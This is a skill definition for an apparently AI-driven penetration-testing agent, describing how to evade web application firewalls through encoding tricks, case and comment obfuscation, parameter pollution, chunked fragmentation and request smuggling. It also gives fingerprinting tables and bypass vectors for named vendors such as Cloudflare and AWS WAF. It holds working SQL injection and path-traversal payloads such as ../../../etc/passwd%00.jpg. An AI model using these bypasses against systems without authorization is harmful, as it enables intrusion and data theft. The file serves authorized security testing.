---
name: waf-bypass
domain: web-attacks
category: web-attacks
tier: balanced
description: Evade Web Application Firewalls using encoding, case/comment tricks, parameter pollution, fragmentation, and header manipulation to reach protected inputs.
toolRefs:
  - httpRequest
  - parseResponse
  - compareResponses
  - checkWaf
  - recordEvidence
  - writeFinding
  - getTargetSummary
triggers:
  - waf evasion technique
  - firewall rule bypass
  - encoded payload smuggling
  - http parameter pollution
  - waf detection test
contextBoosts: []
toolChains: []
compositionRules: {}
mitreAttack:
  - T1190
  - T1059
owaspRefs:
  - A03:2021
  - A06:2021
---

# WAF Evasion & Bypass

## When to Use
Activate when a request is blocked by a WAF but the underlying endpoint logic likely still processes the input (e.g. 403/406 from the edge while the app would accept the payload unfiltered). Use to determine whether WAF rules can be defeated without altering the intended malicious semantics.

## Detection Approach
1. **Baseline the block.** Send a benign and a clearly-malicious request. Note the blocking status, response body signature, and which rule fired (use `checkWaf` and `compareResponses`).
2. **Test encoding variants.** Re-encode the payload (URL, double-URL, HTML entity, UTF-8 overlong, multipart-charset) so the WAF signature misses it while the app decoder normalizes it back.
3. **Test case and comment tricks.** Vary letter case and insert inline comments or whitespace inside syntax tokens (e.g. `SEL/*x*/ECT`) to break token-based rules while the parser still interprets them.
4. **Test parameter pollution.** Send the same parameter multiple times; some WAFs inspect one copy while the app uses another.
5. **Test fragmentation.** Split the payload across parameters, JSON nesting, or chunked transfer so no single inspected segment matches the rule.
6. **Test header manipulation.** Shift payload into alternate headers, override via `X-Original-URL`/`X-Rewrite-URL`, or use content-type juggling.
7. **Switch logic.** If one transform passes the WAF but the app rejects it, the app is the real gate — record and move on. If the WAF passes AND the app acts, the bypass is confirmed.

---

## Encoding Techniques

### URL Encoding
Standard percent-encoding converts special characters to `%XX` form. Most WAFs decode once before inspection — the app may decode a second time.

```
# Basic: each special character encoded
' → %27    " → %22    < → %3C    > → %3E    ; → %3B

# Payload example — SQL injection via URL-encoded input
SELECT%20*%20FROM%20users%20WHERE%20id%3D1
```

### Double URL Encoding
The WAF decodes once (getting `%25XX` → `%XX`), but the app decodes a second time (getting the original character). WAFs that only single-decode miss the payload.

```
# Single decode: %2527 → %27 (still encoded, WAF passes)
# Double decode: %2527 → %27 → ' (app sees the quote)

%2527%2520OR%25201%253D1
```

### Unicode / UTF-8 Overlong Encoding
Encode characters using multi-byte UTF-8 sequences or overlong encodings. The WAF's tokenizer may not normalize these, but the app's decoder may accept them.

```
# Overlong ASCII — ' (0x27) encoded as 3-byte UTF-8
%c0%a7

# Full-width Unicode characters (U+FF01 = !)
%ef%bc%81

# UTF-8 multibyte for < (U+003C)
%c0%bc, %e0%80%bc
```

### HTML Entity Encoding
Embed payload in HTML entities. The browser/app decodes them before rendering; the WAF may not.

```
&#39;          → '    (decimal)
&#x27;         → '    (hex)
&#60;          → <
&lt;           → <
&#0000106;     → j    (zero-padded decimal)
```

### JavaScript/Unicode Escapes in Payloads
For XSS or header injection payloads:

```
\u0027        → '    (JS Unicode escape)
\u003C        → <
\x3C          → <    (hex escape)
\141          → a    (octal escape)
```

---

## Case Manipulation

WAFs often match on keyword signatures with fixed casing. Varying case breaks the pattern while SQL parsers and other backends are case-insensitive.

```
# SQL keywords — case-insensitive to most DBs
sElEcT → SELECT    iNsErT → INSERT    dRoP → DROP
whErE → WHERE      oR → OR            aNd → AND

# Mixed case in a single token
SeLeCt*FrOm users
```

Case manipulation applies to:
- SQL keywords: `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `DROP`, `WHERE`, `FROM`, `UNION`, `OR`, `AND`
- HTML/JS tags: `<ScRiPt>`, `<Img SrC=...>`
- Command injection: `CaT /eTc/PaSsWd`

---

## HTTP Parameter Pollution (HPP)

Send the same parameter name multiple times. Different layers (WAF vs app) may extract different copies.

```
# WAF sees clean value; app sees malicious value
?id=1&id=1' OR '1'='1

# Form-encoded: duplicate keys
search=test&search=' OR 1=1--

# JSON: duplicate keys (last wins in most parsers)
{"search":"test","search":"' OR 1=1--"}

# Array-style (PHP/Node)
search[]=test&search[]=' OR 1=1--
```

### HPP Contexts
| Context | Behavior |
|---------|----------|
| PHP `$_GET` | Last value wins (most configs) |
| Node.js `qs` | Array or last value (config-dependent) |
| ASP.NET `Request.QueryString` | All values returned |
| Tomcat `getParameter` | First value wins |

---

## Chunked Transfer Encoding

Split the payload across chunked transfer boundaries. Some WAFs buffer and reassemble chunks before inspection; others don't — they see partial tokens.

```
Transfer-Encoding: chunked

5
Sel
6
ect 
1
*
8
 from u
5
sers
0

```

Each chunk is a valid segment on its own. The WAF may see only the first chunk or fail to reassemble.

---

## Null Byte Injection

Insert null bytes (`%00`, `\x00`) to truncate the WAF's pattern match while the backend may still process the full string.

```
# WAF sees: "SELECT" — passes inspection
# App sees: "SELECT\x00 * FROM users" — may still execute
SELECT%00*%20FROM%20users

# Truncation in path traversal
../../../etc/passwd%00.jpg
```

**Note:** Null byte injection is largely patched in modern frameworks (Python, Ruby, Java). Primarily effective in C-based apps and legacy PHP.

---

## Protocol-Level Bypass

### HTTP/2 and HTTP/3 Smuggling
WAFs may not support HTTP/2 or HTTP/3, creating a differential between the proxy layer and the origin.

```
# Force HTTP/2 with pseudo-headers
:method: POST
:path: /api/v1/users
:authority: target.com
content-type: application/x-www-form-urlencoded

id=1' OR '1'='1
```

### WebSocket Upgrade
Bypass HTTP-only WAF rules by tunneling the attack through a WebSocket upgrade.

```
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
```

Once upgraded, the WAF may not inspect WebSocket frames. Payloads can be sent directly over the WebSocket connection.

### HTTP Request Smuggling (CL.TE / TE.CL)
Differential parsing between the WAF and the origin server:

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

WAF reads Content-Length (6 bytes), sees `0\r\n\r\nX`. Origin reads Transfer-Encoding, sees chunk `0` (end of body) and starts processing the next pipelined request.

---

## WAF Fingerprinting

### Identify the WAF Vendor

**Response Headers:**
| Header | Vendor |
|--------|--------|
| `cf-ray` | Cloudflare |
| `server: cloudflare` | Cloudflare |
| `x-akamai-transformed` | Akamai |
| `akamai-*` | Akamai |
| `x-datadome-*` | DataDome |
| `x-perimeterx-*` | PerimeterX/HUMAN |
| `x-cdn: Imperva` | Imperva/Incapsula |
| `x-iinfo` | Imperva |
| `server: awselb` or `x-amz-cf-*` | AWS WAF + CloudFront |
| `x-sucuri-id` | Sucuri WAF |

**Error Page Patterns:**
| Pattern | Vendor |
|---------|--------|
| "Just a moment..." title | Cloudflare |
| "Attention Required!" title | Cloudflare |
| "Reference #[0-9]+" in body | Akamai |
| "blocked by DataDome" | DataDome |
| "px-captcha" in DOM | PerimeterX |
| "Incapsula" or "imperva" in cookies | Imperva |
| "x-sucuri-id" in headers | Sucuri |

**Cookie Patterns:**
| Cookie | Vendor |
|--------|--------|
| `__cfduid` / `cf_clearance` | Cloudflare |
| `ak_bmsc` / `bm_sv` | Akamai |
| `datadome` | DataDome |
| `_px*` / `pxhd` | PerimeterX |
| `visid_incap_*` / `incap_ses_*` | Imperva |
| `sucuri-cloudproxy-*` | Sucuri |

---

## Vendor-Specific Bypass Techniques

### Cloudflare
- **Free tier**: Mostly signature-based. URL-encoding and case variation often sufficient.
- **Pro/Business**: JavaScript challenge — need headless browser execution.
- **Enterprise**: Turnstile CAPTCHA + ML-based bot detection. May require `X-Forwarded-For` rotation from clean IPs.
- **Bypass vectors**:
  - `X-Forwarded-For: 127.0.0.1` — some configs trust loopback-originated requests
  - Direct IP access (bypass DNS-level Cloudflare) — `Host: target.com` header
  - HTTP/2 smuggling — origin may not use Cloudflare's HTTP/2 stack
  - `cf_clearance` cookie replay (if captured from a real browser session)

### ModSecurity (ModSecurity/OWASP CRS)
- **Default rules**: Mostly regex-based signature matching.
- **Bypass vectors**:
  - URL-encode special characters (single or double)
  - Inline comments in SQL: `SELECT/*bypass*/id FROM users`
  - Unicode normalization: full-width characters for SQL keywords
  - Whitespace manipulation: tabs (`%09`), newlines (`%0a`), carriage returns (`%0d`) instead of spaces
  - `Transfer-Encoding: chunked` with crafted chunks
  - `Content-Type` mismatch: send JSON body with `application/x-www-form-urlencoded` content type

### AWS WAF
- **Managed rules**: AWS Native Rules + Marketplace rules (e.g., Trend Micro, F5).
- **Bypass vectors**:
  - AWS WAF inspects only the first 8KB of body by default — split payloads beyond that threshold
  - Use `aws-waf-timestamp` header manipulation
  - AWS WAF may not inspect HTTP/2 pseudo-headers fully
  - IP reputation rules can be bypassed via proxy rotation
  - Rate-based rules: spread requests across time/IPs

### Imperva/Incapsula
- **Detection**: Cookie-based (`visid_incap_*`, `incap_ses_*`) + JavaScript fingerprinting.
- **Bypass vectors**:
  - Direct origin IP access (bypass Imperva edge)
  - Cookie stripping: remove `incap_ses_*` and send fresh requests
  - Imperva may cache blocking decisions — rotating `X-Forwarded-For` can reset
  - Some Imperva configurations don't inspect requests with `Content-Encoding: br` (Brotli)

### F5 BIG-IP ASM
- **Detection**: `BIGipServer*` cookies, `TS*` cookies.
- **Bypass vectors**:
  - ASM inspects request but may not inspect chunked bodies fully
  - URL-encode path parameters (ASM may normalize before inspection)
  - ASM's anti-bot may be bypassed with valid `User-Agent` + JavaScript execution

---

## Pitfalls
- Assuming a passed WAF means the attack worked — the app may still reject it.
- Over-encoding until the app can no longer decode the payload.
- Ignoring that different WAF engines normalize differently; a transform safe on one may be caught on another.
- Treating a 200 as success without confirming functional impact.
- Not recording the WAF vendor before attempting bypass — fingerprint first, then target.
- Using payload concatenation that breaks the app's input validation (e.g., adding spaces changes the SQL meaning).

## Verification & Impact
- **Confirmed:** WAF returns pass (non-block) AND the application exhibits the intended behavior change.
- **Suspected:** WAF passes but application response is inconclusive.
- Document which transform defeated which rule and the resulting exposure. Use `writeFinding` with both WAF and app-evidence captured via `recordEvidence`.

## Key Concepts
| Term | Meaning |
|------|---------|
| Normalization | App decodes payload back to canonical form |
| Signature gap | WAF rule misses encoded/transformed input |
| HPP | HTTP Parameter Pollution |
| Fragmentation | Splitting payload across inputs |
| Overlong encoding | Using multi-byte UTF-8 to represent ASCII chars |
| Chunked smuggling | Exploiting chunked transfer encoding differential |
| WAF fingerprinting | Identifying the vendor before attempting bypass |
| Differential parsing | WAF and app interpret the same request differently |
